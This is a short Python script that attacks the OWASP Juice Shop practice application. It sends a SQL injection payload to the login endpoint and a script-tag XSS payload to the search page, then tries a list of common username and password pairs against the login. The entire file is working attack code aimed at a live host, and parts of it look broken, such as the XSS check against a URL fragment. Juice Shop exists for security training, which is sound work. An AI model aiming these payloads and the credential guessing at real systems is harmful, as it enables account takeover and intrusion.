import requests
from bs4 import BeautifulSoup

url = 'https://juice-shop.herokuapp.com/rest/user/login'
known_usernames = ['admin', 'customer', 'user']
password_attempts = ['password', 'admin123', 'letmein']

def get_csrf_token():
    csrf_response = requests.get('https://juice-shop.herokuapp.com')
    soup = BeautifulSoup(csrf_response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': '_csrf'})['value']
    return csrf_token

def scan_for_vulnerabilities(url):
    headers = {'Content-Type': 'application/json'}
    csrf_token = get_csrf_token()
    
    sql_payload = "' OR '1'='1"
    response = requests.post(url, headers=headers, json={'email': sql_payload, 'password': 'test', '_csrf': csrf_token})
    if "auth" in response.text:
        print("Possible SQL Injection vulnerability identified.")
    
    xss_payload = "<script>alert(1)</script>"
    search_response = requests.get('https://juice-shop.herokuapp.com/#/search?q=' + xss_payload)
    if xss_payload in search_response.text:
        print("Possible XSS vulnerability identified.")
    
    for username in known_usernames:
        for password in password_attempts:
            login_data = {'email': username, 'password': password, '_csrf': csrf_token}
            login_response = requests.post(url, headers=headers, json=login_data)
            if "Login successful" in login_response.text:
                print(f"Successful login with username: {username} and password: {password}")

scan_for_vulnerabilities(url)
